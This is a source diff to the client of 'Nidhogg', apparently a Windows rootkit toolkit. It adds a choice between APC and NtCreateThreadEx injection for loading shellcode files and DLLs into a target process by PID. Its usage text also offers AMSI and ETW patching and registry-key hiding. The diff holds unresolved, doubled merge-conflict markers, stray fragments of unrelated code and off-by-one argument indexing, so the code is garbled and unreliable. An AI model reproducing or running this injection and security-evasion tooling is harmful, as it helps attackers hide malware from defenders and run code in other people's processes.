@@ -38,8 +38,8 @@ void PrintUsage() {
 	std::cout << "\tNidhoggClient.exe reg [add | remove | clear | hide | unhide | query] [key] [value]" << std::endl;
 	std::cout << "\tNidhoggClient.exe patch [pid] [amsi | etw | module name] [function] [patch comma seperated]" << std::endl;
 	std::cout << "\tNidhoggClient.exe [write | read] [pid] [remote address] [size] [mode]" << std::endl;
-	std::cout << "\tNidhoggClient.exe shinject [pid] [shellcode file] [parameter 1] [parameter 2] [parameter 3]" << std::endl;
-	std::cout << "\tNidhoggClient.exe dllinject [pid] [dll path]" << std::endl;
+	std::cout << "\tNidhoggClient.exe shinject [apc | thread] [pid] [shellcode file] [parameter 1] [parameter 2] [parameter 3]" << std::endl;
+	std::cout << "\tNidhoggClient.exe dllinject [apc | thread] [pid] [dll path]" << std::endl;
 }
 
 int Error(int errorCode) {
@@ -774,10 +774,12 @@ int wmain(int argc, const wchar_t* argv[]) {
 
 		case Options::InjectShellcode:
 		{
+			InjectionType injectionType;
 			PVOID parameter1 = NULL;
 			PVOID parameter2 = NULL;
 			PVOID parameter3 = NULL;
 
+<<<<<<< HEAD
 <<<<<<< HEAD
 			success = Nidhogg::ModuleUtils::NidhoggPatchModule(hNidhogg, pid, (wchar_t*)argv[3], (char*)functionName.c_str(), patch);
 		}
@@ -792,6 +794,9 @@ int wmain(int argc, const wchar_t* argv[]) {
 =======
 			int pid = _wtoi(argv[2]);
 >>>>>>> 04ddc77 (Added usermode shellcode injection)
+=======
+			int pid = _wtoi(argv[3]);
+>>>>>>> 8a9e3ee (Updated usermode side)
 
 			if (pid == 0) {
 				std::cerr << "[ - ] Invalid PID." << std::endl;
@@ -799,35 +804,58 @@ int wmain(int argc, const wchar_t* argv[]) {
 				break;
 			}
 
-			std::ifstream input(argv[3], std::ios::binary);
+			if (_wcsicmp(argv[2], L"thread") == 0)
+				injectionType = NtCreateThreadExInjection;
+
+			else if (_wcsicmp(argv[2], L"apc") == 0) {
+				injectionType = APCInjection;
+
+				if (argc >= 5) {
+					parameter1 = (PVOID)argv[5];
+
+					if (argc >= 6) {
+						parameter2 = (PVOID)argv[6];
+
+						if (argc == 7) {
+							parameter3 = (PVOID)argv[7];
+						}
+					}
+				}
+			}
+			else {
+				std::cerr << "[ - ] Invalid injection type." << std::endl;
+				success = NIDHOGG_INVALID_OPTION;
+				break;
+			}
+
+			std::ifstream input(argv[4], std::ios::binary);
 
 			if (input.bad()) {
 				std::cerr << "[ - ] Invalid shellcode file." << std::endl;
 				success = NIDHOGG_INVALID_OPTION;
 				break;
 			}
-
 			std::vector<unsigned char> shellcode(std::istreambuf_iterator<char>(input), {});
 
-			if (argc >= 5) {
-				parameter1 = (PVOID)argv[4];
-
-				if (argc >= 6) {
-					parameter2 = (PVOID)argv[5];
-
-					if (argc == 7) {
-						parameter3 = (PVOID)argv[6];
-					}
-				}
-			}
-
-			success = Nidhogg::ModuleUtils::NidhoggInjectShellcode(hNidhogg, pid, shellcode.data(), shellcode.size(), parameter1, parameter2, parameter3);
+			success = Nidhogg::ModuleUtils::NidhoggInjectShellcode(hNidhogg, pid, shellcode.data(), shellcode.size(), parameter1, parameter2, parameter3, injectionType);
 			break;
 		}
 
 		case Options::InjectDll:
 		{
-			int pid = _wtoi(argv[2]);
+			InjectionType injectionType;
+
+			if (_wcsicmp(argv[2], L"thread") == 0)
+				injectionType = NtCreateThreadExInjection;
+			else if (_wcsicmp(argv[2], L"apc") == 0)
+				injectionType = APCInjection;
+			else {
+				std::cerr << "[ - ] Invalid injection type." << std::endl;
+				success = NIDHOGG_INVALID_OPTION;
+				break;
+			}
+
+			int pid = _wtoi(argv[3]);
 
 			if (pid == 0) {
 				std::cerr << "[ - ] Invalid PID." << std::endl;
@@ -835,10 +863,10 @@ int wmain(int argc, const wchar_t* argv[]) {
 				break;
 			}
 
-			std::wstring temp = std::wstring(argv[3]);
+			std::wstring temp = std::wstring(argv[4]);
 			std::string dllPath = std::string(temp.begin(), temp.end());
 
-			success = Nidhogg::ModuleUtils::NidhoggInjectDll(hNidhogg, pid, dllPath.c_str());
+			success = Nidhogg::ModuleUtils::NidhoggInjectDll(hNidhogg, pid, dllPath.c_str(), injectionType);
 			break;
 		}
 	}
